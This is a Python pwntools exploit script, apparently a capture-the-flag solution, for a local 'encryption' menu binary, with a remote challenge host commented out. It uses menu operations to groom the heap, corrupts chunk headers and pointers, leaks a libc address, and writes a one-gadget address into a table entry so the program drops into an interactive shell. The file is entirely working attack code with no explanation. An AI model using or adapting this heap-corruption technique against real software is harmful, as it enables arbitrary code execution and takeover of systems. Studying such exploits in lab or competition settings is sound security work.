from pwn import *

r = process('./encryption')
#gdb.attach(r)
#r = remote("stack.overflow.fail", 9004)

def encrypt(option, size, message):
	r.sendline('1')
	print r.recvuntil(">")
	r.sendline(str(option))
	print r.recvuntil(">")
	r.sendline(str(size))
	print r.recvuntil("message: ")
	r.sendline(message)
	print r.recvuntil(">")

def remove(index):
	r.sendline('2')
	print r.recvuntil("remove: ")
	r.sendline(str(index))
	print r.recvuntil(">")

def view():
	r.sendline('3')
	ret = []
	sice = r.recvline()
	while "Message #" in sice:
		tmp = []
		print r.recvuntil("Plaintext: ")
		tmp.append(r.recvline().strip())
		print r.recvuntil("Ciphertext: ")
		tmp.append(r.recvline().strip())
		ret.append(tmp)
		sice = r.recvline()
		if sice == "\n":
			sice = r.recvline()
		print "sice " + sice
	print r.recvuntil(">")
	return ret

def edit(index, message):
	r.sendline('4')
	print r.recvuntil("edit\n")
	r.sendline(str(index))
	print r.recvuntil("message\n")
	r.sendline(message)
	print r.recvuntil(">")

print r.recvuntil("id?\n")
r.sendline('0')

print r.recvuntil(">")

encrypt(2, 0x10, 'aaaa')
encrypt(2, 0x10, 'eeee')
encrypt(2, 0x10, 'gggg')
encrypt(2, 0x10, 'dddd')
encrypt(2, 0xb0, 'bbbb')
encrypt(2, 0x10, 'dddd')
remove(0)
remove(1)
remove(2)
remove(3)
remove(4)
encrypt(2, 0x10, 'cccc')
encrypt(2, 0x30, 'ffff')
encrypt(2, 0x20, 'hhhh')
remove(2)
edit(4, p64(0) + p64(0x31) + p64(0)*5 + p64(0x41) + p64(0)*7 + p64(0x31) + p64(0)*5 + p64(0x31))
encrypt(2, 0x10, 'iiii')
encrypt(2, 0x10, 'jjjj')
encrypt(2, 0x10, 'kkkk')
encrypt(2, 0x10, 'llll')
encrypt(2, 0x10, 'mmmm')
edit(1, p64(0) + p64(0x31) + p64(0x602028)*2 + p64(0x000000000040093c) + p64(0x0000000000400887))

libc_leak = u64(view()[7][0] + '\x00\x00')
print hex(libc_leak)
libc_base = libc_leak - 0x6f690 #local and remote
magic = libc_base + 0x45216
print hex(libc_base)
print hex(magic)

edit(1, p64(0) + p64(0x31) + p64(0x602028)*2 + p64(magic)*2)

r.sendline('3')
r.interactive()